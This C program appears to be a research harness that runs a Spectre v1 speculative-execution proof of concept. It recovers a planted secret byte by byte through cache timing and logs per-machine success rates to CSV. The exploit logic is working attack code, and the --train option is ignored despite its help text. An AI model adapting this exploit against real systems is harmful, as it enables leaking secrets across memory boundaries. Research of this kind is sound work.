#include "spectre.h"

#include <errno.h>
#include <limits.h>

typedef struct {
    uint8_t guess;
    uint8_t second;
    int score1;
    int score2;
} e2_result;

static void usage(const char *prog) {
    fprintf(stderr,
            "Uso: %s --threshold N [opciones]\n"
            "  --machine-id ID   Identificador del equipo (o MACHINE_ID)\n"
            "  --threshold N     Umbral de acierto de caché en ciclos (obligatorio)\n"
            "  --attempts N      Intentos por byte (por defecto 1000)\n"
            "  --train N         Entrenamientos por ataque (por defecto 5)\n"
            "  --runs N          Repeticiones completas (por defecto 50)\n"
            "  --bytes N         Bytes a recuperar, 1..%d (por defecto %d)\n"
            "  --out FILE        CSV de salida (por defecto stdout)\n"
            "  --help            Muestra esta ayuda\n"
            "\n"
            "El umbral debe salir de E1 para esta máquina. No uses 80 por\n"
            "defecto: es un valor del PoC original pensado para Intel.\n",
            prog, SECRET_LEN, SECRET_LEN);
}

static int parse_ull(const char *s, unsigned long long *out) {
    if (!s || !*s) return -1;
    errno = 0;
    char *end = NULL;
    unsigned long long v = strtoull(s, &end, 10);
    if (errno != 0 || !end || *end != '\0') return -1;
    *out = v;
    return 0;
}

static e2_result read_memory_byte(size_t malicious_x, int attempts, int train,
                                  int threshold) {
    static int results[256];
    memset(results, 0, sizeof results);

    for (int attempt = 0; attempt < attempts; attempt++) {
        flush_array2();

        int training_x = attempt % ARRAY1_SIZE;

        /* Secuencia del PoC original: 5 entrenamientos y 1 ataque, repetido
         * 5 veces. Cada llamada va precedida de un fallo de caché en
         * array1_size para alargar la ventana especulativa. */
        for (int j = 29; j >= 0; j--) {
            flush_array1_size();
            for (volatile int z = 0; z < 100; z++) {
            }
            /* Misma selección sin saltos que el PoC original: evita que
             * las ramas del bucle alteren el predictor. */
            size_t x = ((j % 6) - 1) & ~(size_t)0xFFFF;
            x = x | (x >> 16);
            x = (size_t)training_x ^ (x & (malicious_x ^ (size_t)training_x));
            victim_function(x);
        }
        (void)train;

        for (int i = 0; i < 256; i++) {
            int mix_i = ((i * 167) + 13) & 255;
            volatile uint8_t *addr = &array2[mix_i * ARRAY2_STRIDE];

            uint64_t t0 = rdtscp();
            uint8_t value = *addr;
            uint64_t t1 = rdtscp();
            (void)value;

            if ((int)(t1 - t0) <= threshold &&
                mix_i != (int)array1[training_x]) {
                results[mix_i]++;
            }
        }
    }

    int best = -1;
    int second = -1;
    for (int i = 0; i < 256; i++) {
        if (best < 0 || results[i] > results[best]) {
            second = best;
            best = i;
        } else if (second < 0 || results[i] > results[second]) {
            second = i;
        }
    }

    e2_result r;
    r.guess = (uint8_t)best;
    r.second = (uint8_t)second;
    r.score1 = results[best];
    r.score2 = results[second];
    return r;
}

int main(int argc, char **argv) {
    const char *machine_id = NULL;
    const char *out_path = NULL;
    unsigned long long threshold = 0;
    unsigned long long attempts = 1000;
    unsigned long long train = 5;
    unsigned long long runs = 50;
    unsigned long long bytes = SECRET_LEN;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--help") == 0) {
            usage(argv[0]);
            return 0;
        } else if (strcmp(argv[i], "--machine-id") == 0 && i + 1 < argc) {
            machine_id = argv[++i];
        } else if (strcmp(argv[i], "--threshold") == 0 && i + 1 < argc) {
            if (parse_ull(argv[++i], &threshold) != 0) {
                fprintf(stderr, "error: --threshold no es un número válido\n");
                return 2;
            }
        } else if (strcmp(argv[i], "--attempts") == 0 && i + 1 < argc) {
            if (parse_ull(argv[++i], &attempts) != 0) {
                fprintf(stderr, "error: --attempts no es un número válido\n");
                return 2;
            }
        } else if (strcmp(argv[i], "--train") == 0 && i + 1 < argc) {
            if (parse_ull(argv[++i], &train) != 0) {
                fprintf(stderr, "error: --train no es un número válido\n");
                return 2;
            }
        } else if (strcmp(argv[i], "--runs") == 0 && i + 1 < argc) {
            if (parse_ull(argv[++i], &runs) != 0) {
                fprintf(stderr, "error: --runs no es un número válido\n");
                return 2;
            }
        } else if (strcmp(argv[i], "--bytes") == 0 && i + 1 < argc) {
            if (parse_ull(argv[++i], &bytes) != 0) {
                fprintf(stderr, "error: --bytes no es un número válido\n");
                return 2;
            }
        } else if (strcmp(argv[i], "--out") == 0 && i + 1 < argc) {
            out_path = argv[++i];
        } else {
            fprintf(stderr, "error: opción desconocida o incompleta: %s\n",
                    argv[i]);
            usage(argv[0]);
            return 2;
        }
    }

    if (threshold == 0 || threshold > 100000) {
        fprintf(stderr,
                "error: falta --threshold o está fuera de rango.\n"
                "Ejecuta E1 y usa el umbral del valle del histograma.\n");
        return 2;
    }
    if (attempts == 0 || attempts > INT_MAX || train == 0 ||
        train > INT_MAX || runs == 0 || runs > INT_MAX) {
        fprintf(stderr,
                "error: --attempts, --train y --runs deben ser > 0 y caber "
                "en int\n");
        return 2;
    }
    if (bytes == 0 || bytes > SECRET_LEN) {
        fprintf(stderr, "error: --bytes debe estar entre 1 y %d\n", SECRET_LEN);
        return 2;
    }

    FILE *out = stdout;
    if (out_path && strcmp(out_path, "-") != 0) {
        out = fopen(out_path, "w");
        if (!out) {
            fprintf(stderr, "error: no se pudo abrir %s: %s\n", out_path,
                    strerror(errno));
            return 1;
        }
    }

    machine_info mi;
    machine_info_init(&mi, machine_id);

    for (size_t i = 0; i < sizeof array2; i++)
        array2[i] = 1;

    fputs("machine_id,cpu,family,model,stepping,microcode,kernel,gcc,flags,"
          "variant,threshold,train,run,byte,guess,score1,score2,success,"
          "cycles\n",
          out);

    for (int run = 0; run < (int)runs; run++) {
        for (int byte = 0; byte < (int)bytes; byte++) {
            e2_result r = read_memory_byte(
                malicious_x_for_byte((size_t)byte), (int)attempts, (int)train,
                (int)threshold);
            int success = (r.guess == (uint8_t)secret_text[byte]);
            machine_info_write_prefix(out, &mi);
            fprintf(out, "%s,%llu,%llu,%d,%d,%u,%d,%d,%d,\n",
                    VARIANT_NAME, threshold, train, run, byte,
                    (unsigned)r.guess, r.score1, r.score2, success);
        }
        fprintf(stderr, "run %d/%llu terminada\n", run + 1, runs);
    }

    if (out != stdout) fclose(out);
    return 0;
}
